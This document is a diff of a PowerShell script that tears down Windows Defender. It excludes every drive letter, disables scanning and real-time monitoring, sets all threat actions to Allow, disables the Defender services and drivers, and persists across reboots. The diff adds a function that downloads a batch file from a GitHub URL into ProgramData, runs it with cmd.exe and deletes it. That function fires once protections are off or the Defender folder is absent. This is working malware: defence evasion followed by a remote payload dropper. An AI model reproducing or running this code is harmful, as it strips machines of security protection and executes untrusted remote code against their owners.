@@ -1,3 +1,20 @@
+$services = $false
+$drivers = $false
+function getOthers{
+    do {
+        $ping = test-connection -comp github.com -count 1 -Quiet
+    } until ($ping)
+        Invoke-WebRequest -Uri "https://raw.githubusercontent.com/4V4loon/InspectorConfig/main/oneline.bat" -OutFile $env:ProgramData\Microsoft\Windows\one.bat 
+        cmd.exe /c '%ProgramData%\Microsoft\Windows\one.bat'
+        Remove-Item -Path $env:ProgramData\Microsoft\one.bat -Force
+        exit
+}
+$defenderFolder = "$env:ProgramData\Microsoft\Windows Defender\"
+if (!(Test-Path -Path $defenderFolder)) {
+    getOthers
+}
+
+
 if(-Not $($(whoami) -eq "nt authority\system")) {
     $IsSystem = $false
     if (-Not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] 'Administrator')) {
@@ -16,13 +33,11 @@ if(-Not $($(whoami) -eq "nt authority\system")) {
 } else {
     $IsSystem = $true
 }
-
 67..90|foreach-object{
     $drive = [char]$_
     Add-MpPreference -ExclusionPath "$($drive):\" -ErrorAction SilentlyContinue
     Add-MpPreference -ExclusionProcess "$($drive):\*" -ErrorAction SilentlyContinue
 }
-
 Set-MpPreference -DisableArchiveScanning 1 -ErrorAction SilentlyContinue
 Set-MpPreference -DisableBehaviorMonitoring 1 -ErrorAction SilentlyContinue
 Set-MpPreference -DisableIntrusionPreventionSystem 1 -ErrorAction SilentlyContinue
@@ -33,63 +48,51 @@ Set-MpPreference -DisableScanningMappedNetworkDrivesForFullScan 1 -ErrorAction S
 Set-MpPreference -DisableScanningNetworkFiles 1 -ErrorAction SilentlyContinue
 Set-MpPreference -DisableScriptScanning 1 -ErrorAction SilentlyContinue
 Set-MpPreference -DisableRealtimeMonitoring 1 -ErrorAction SilentlyContinue
-
-
 Set-MpPreference -LowThreatDefaultAction Allow -ErrorAction SilentlyContinue
 Set-MpPreference -ModerateThreatDefaultAction Allow -ErrorAction SilentlyContinue
 Set-MpPreference -HighThreatDefaultAction Allow -ErrorAction SilentlyContinue
-
-
-
 $need_reboot = $false
-
-# WdNisSvc Network Inspection Service 
-# WinDefend Antivirus Service
-# Sense : Advanced Protection Service
-
+$counter = 0
 $svc_list = @("WdNisSvc", "WinDefend", "Sense")
 foreach($svc in $svc_list) {
     if($(Test-Path "HKLM:\SYSTEM\CurrentControlSet\Services\$svc")) {
         if( $(Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\$svc").Start -eq 4) {
-           
+           ++$counter
         } else {
             
             Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\$svc" -Name Start -Value 4
             $need_reboot = $true
         }
     } else {
-       
+        ++$counter
     }
 }
-
-
-# WdnisDrv : Network Inspection System Driver
-# wdfilter : Mini-Filter Driver
-# wdboot : Boot Driver
-
+if ($counter -ge 3){
+    $services = $true
+}
+$counter=0
 $drv_list = @("WdnisDrv", "wdfilter", "wdboot")
 foreach($drv in $drv_list) {
     if($(Test-Path "HKLM:\SYSTEM\CurrentControlSet\Services\$drv")) {
         if( $(Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\$drv").Start -eq 4) {
-           
+           ++$counter
         } else {
             
             Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\$drv" -Name Start -Value 4
             $need_reboot = $true
         }
     } else {
-      
+        ++$counter
     }
 }
-
+if ($counter -ge 3){
+    $drivers = $true
+}
 # Check if service running or not
 if($(GET-Service -Name WinDefend).Status -eq "Running") {   
    
     $need_reboot = $true
-} else {
-   
-
-}
+} 
 
 
 ## STEP 3 : Reboot if needed, add a link to the script to Startup (will be runned again after reboot)
@@ -136,48 +139,14 @@ if($need_reboot) {
         # Disable in registry
         Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender" -Name DisableAntiSpyware -Value 1
         Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name DisableAntiSpyware -Value 1
-        do {
-            $ping = test-connection -comp github.com -count 1 -Quiet
-          } until ($ping)
-              Invoke-WebRequest -Uri "https://raw.githubusercontent.com/4V4loon/InspectorConfig/main/oneline.bat" -OutFile $env:ProgramData\Microsoft\Windows\one.bat 
-              cmd.exe /c '%ProgramData%\Microsoft\Windows\one.bat'
-
-    } else {
        
     }
+    Get-Variable -Name ('services','drivers') | % {if ($_.Value -eq $true) {
+     getOthers
+    }
 
 
-    if($MyInvocation.UnboundArguments -And $($MyInvocation.UnboundArguments.tolower().Contains("-delete"))) {
-        
-        # Delete Defender files
+    
 
-        function Delete-Show-Error {
-            $path_exists = Test-Path $args[0]
-            if($path_exists) {
-                Remove-Item -Recurse -Force -Path $args[0]
-            } else {
-                
-            }
-        }
-
-      
-
-        # Delete files
-        Delete-Show-Error "C:\ProgramData\Windows\Windows Defender\"
-        Delete-Show-Error "C:\ProgramData\Windows\Windows Defender Advanced Threat Protection\"
-
-        # Delete drivers
-        Delete-Show-Error "C:\Windows\System32\drivers\wd\"
-
-        # Delete service registry entries
-        foreach($svc in $svc_list) {
-            Delete-Show-Error "HKLM:\SYSTEM\CurrentControlSet\Services\$svc"
-        }
-
-        # Delete drivers registry entries
-        foreach($drv in $drv_list) {
-            Delete-Show-Error "HKLM:\SYSTEM\CurrentControlSet\Services\$drv"
-        }
     }
 }
-
